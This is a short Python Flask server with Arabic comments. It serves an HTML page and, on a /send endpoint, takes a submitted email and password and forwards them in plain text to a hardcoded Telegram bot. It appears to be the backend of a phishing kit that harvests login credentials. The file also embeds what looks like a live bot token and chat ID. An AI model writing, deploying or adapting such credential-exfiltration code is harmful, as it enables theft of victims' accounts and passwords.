import os
import requests
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv

# تحميل القيم من ملف .env إن وجد
load_dotenv()

app = Flask(__name__)

# ✅ الخيار الثاني (للتجربة فقط): يمكنك وضع القيم مباشرة هنا
TELEGRAM_TOKEN = "8527017412:AAEz0XMAO9G_f4c0kNnlgSucPEzQpaCmD2s"
CHAT_ID = "1666227829"

# تحميل صفحة HTML
with open("index.html", "r", encoding="utf-8") as f:
    INDEX_HTML = f.read()

@app.route("/", methods=["GET"])
def index():
    return render_template_string(INDEX_HTML)

@app.route("/send", methods=["POST"])
def send_to_telegram():
    # تحقق من وجود التوكن و chat_id
    if not TELEGRAM_TOKEN or not CHAT_ID:
        return jsonify({"status": "error", "message": "Telegram credentials not configured"}), 500

    data = request.get_json(silent=True) or {}
    email = data.get("email", "").strip()
    password = data.get("password", "").strip()

    # تحقق بسيط
    if not email or not password:
        return jsonify({"status": "error", "message": "email and password required"}), 400

    message = f"Email: {email}\nPassword: {password}"

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }

    try:
        resp = requests.post(url, json=payload, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        return jsonify({"status": "error", "message": str(e)}), 502

    return jsonify({"status": "sent"})

if __name__ == "__main__":
    app.run(debug=True)
